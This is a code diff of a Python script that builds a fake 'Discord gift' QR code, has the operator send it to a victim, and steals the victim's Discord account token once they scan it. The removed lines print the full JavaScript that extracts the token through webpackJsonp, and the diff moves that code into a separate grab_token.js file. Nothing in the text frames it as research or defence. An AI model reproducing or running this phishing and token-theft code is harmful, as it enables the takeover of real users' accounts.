@@ -72,33 +72,16 @@ def main():
     paste_template()
 
     print('- QR Code has been generated. > discord_gift.png')
-    print('Send the QR Code to user and scan. Waiting..')
+    print('Send the QR Code to user and scan. Waiting..\n')
 
     while True:
         if discord_login != driver.current_url:
             print('Grabbing token..')
-            token = driver.execute_script('''
-                var req = webpackJsonp.push([
-                    [], {
-                        extra_id: (e, t, r) => e.exports = r
-                    },
-                    [
-                        ["extra_id"]
-                    ]
-                ]);
-                for (let e in req.c)
-                    if (req.c.hasOwnProperty(e)) {
-                        let t = req.c[e].exports;
-                        if (t && t.__esModule && t.default)
-                            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
-                    }
-                return token;
-            ''')
-            print('---')
+            token = driver.execute_script(open("grab_token.js", "r").read())
             print('Token grabbed:', token)
             break
 
-    print('Task complete.')
+    print('\nTask complete.')
 
 
 if __name__ == '__main__':
